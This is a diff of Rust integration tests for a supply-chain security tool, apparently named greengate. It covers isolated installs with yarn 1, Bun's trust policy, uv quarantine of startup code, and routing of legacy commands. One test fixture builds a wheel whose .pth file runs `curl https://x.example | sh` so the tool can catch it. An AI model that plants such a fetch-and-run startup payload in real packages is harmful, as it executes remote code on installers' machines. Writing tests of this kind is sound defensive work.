@@ -1594,7 +1594,14 @@ fn pip_install_runs_the_install_subcommand() {
         assert!(status.success(), "clean pip install must pass: {args:?}");
     }
 
-    let log = std::fs::read_to_string(dir.path().join("args.log")).unwrap();
+    // greengate probes `--version` first to decide whether to route to
+    // `greengate install`; a fake pip reports none, so the legacy path runs.
+    let log: String = std::fs::read_to_string(dir.path().join("args.log"))
+        .unwrap()
+        .lines()
+        .filter(|l| *l != "--version")
+        .map(|l| format!("{l}\n"))
+        .collect();
     assert_eq!(
         log, "install requests\ninstall requests\n",
         "pip must be called as `pip install <args>`, with `install` never doubled"
@@ -3015,4 +3022,117 @@ fn install_cargo_plan_restores_the_manifests() {
         "Cargo.toml restored"
     );
     assert!(!app.join("Cargo.lock").exists(), "no lockfile left behind");
+}
+
+// ── greengate install: yarn 1, bun, uv, and legacy routing ────────────────────
+
+#[test]
+fn install_yarn1_isolated_refuses_writes_outside_the_package() {
+    let yarn1 = Command::new("yarn")
+        .arg("--version")
+        .output()
+        .is_ok_and(|o| o.status.success() && o.stdout.starts_with(b"1."));
+    if !yarn1 || !tool_available("npm", &["--version"]) || !tool_available("bwrap", &["--version"])
+    {
+        eprintln!("skipped: needs yarn 1, npm and bubblewrap");
+        return;
+    }
+    let dir = npm_project(&[("victim", "{}"), ("tamper", TAMPER), ("builder", BUILD)]);
+    let (code, report, stderr) = install(dir.path(), &["--isolate", "bwrap", "yarn", "install"]);
+    assert_eq!(code, Some(1), "{stderr}\n{report}");
+    assert!(
+        rules_of(&report, "findings").contains(&"INSTALL/BlockedWrite".to_string()),
+        "{report}"
+    );
+    let victim = std::fs::read_to_string(dir.path().join("node_modules/victim/index.js")).unwrap();
+    assert_eq!(victim, "module.exports = \"victim\";\n");
+    assert!(dir.path().join("node_modules/builder/build/out").is_file());
+}
+
+#[test]
+fn install_bun_follows_bun_trust_policy() {
+    if !tool_available("bun", &["--version"]) {
+        eprintln!("skipped: needs bun");
+        return;
+    }
+    // Neither local package is trusted: Bun would run no scripts, so
+    // greengate runs none either.
+    let dir = npm_project(&[("victim", "{}"), ("tamper", TAMPER)]);
+    let (code, report, stderr) = install(dir.path(), &["bun", "install"]);
+    assert_eq!(code, Some(0), "{stderr}\n{report}");
+    assert_eq!(rules_of(&report, "warnings"), ["INSTALL/BuildNotAllowed"]);
+    assert!(rules_of(&report, "findings").is_empty(), "{report}");
+}
+
+#[test]
+fn install_uv_quarantines_startup_code_before_python_runs() {
+    if !tool_available("uv", &["--version"]) || !tool_available("python3", &["--version"]) {
+        eprintln!("skipped: needs uv and python3");
+        return;
+    }
+    let dir = tempfile::tempdir().unwrap();
+    let links = dir.path().join("wheels");
+    std::fs::create_dir(&links).unwrap();
+    wheel(
+        &links,
+        "badpkg",
+        &[(
+            "badpkg.pth",
+            "import os; os.system('curl https://x.example | sh')\n",
+        )],
+    );
+    std::fs::write(
+        dir.path().join("pyproject.toml"),
+        format!(
+            "[project]\nname = \"app\"\nversion = \"0.1.0\"\nrequires-python = \">=3.8\"\ndependencies = [\"badpkg==1.0\"]\n\
+             [tool.uv]\nno-index = true\nfind-links = [\"{}\"]\npackage = false\n",
+            links.display()
+        ),
+    )
+    .unwrap();
+    std::fs::write(
+        dir.path().join(".greengate.toml"),
+        "[supply_chain]\nslopsquat_check = false\n",
+    )
+    .unwrap();
+    let (code, report, stderr) = install(dir.path(), &["uv", "sync"]);
+    assert_eq!(code, Some(1), "{stderr}\n{report}");
+    assert_eq!(rules_of(&report, "findings"), ["INSTALL/StartupCode"]);
+    let site: Vec<std::path::PathBuf> = std::fs::read_dir(dir.path().join(".venv/lib"))
+        .unwrap()
+        .flatten()
+        .map(|e| e.path().join("site-packages"))
+        .collect();
+    assert!(
+        site.iter().all(|s| !s.join("badpkg.pth").exists()),
+        "the .pth is quarantined"
+    );
+    assert!(
+        site.iter()
+            .any(|s| s.join("badpkg.pth.greengate-blocked").exists())
+    );
+}
+
+#[test]
+fn watch_install_routes_real_package_managers_into_install() {
+    if !tool_available("npm", &["--version"]) {
+        eprintln!("skipped: needs npm");
+        return;
+    }
+    let dir = npm_project(&[("builder", BUILD)]);
+    let out = Command::new(binary())
+        .args(["watch-install", "npm", "install"])
+        .current_dir(dir.path())
+        .output()
+        .unwrap();
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(out.status.success(), "{stderr}");
+    assert!(
+        stderr.contains("deprecated") && stderr.contains("greengate install npm install"),
+        "{stderr}"
+    );
+    assert!(
+        stderr.contains("install:inspect"),
+        "ran the install flow: {stderr}"
+    );
 }
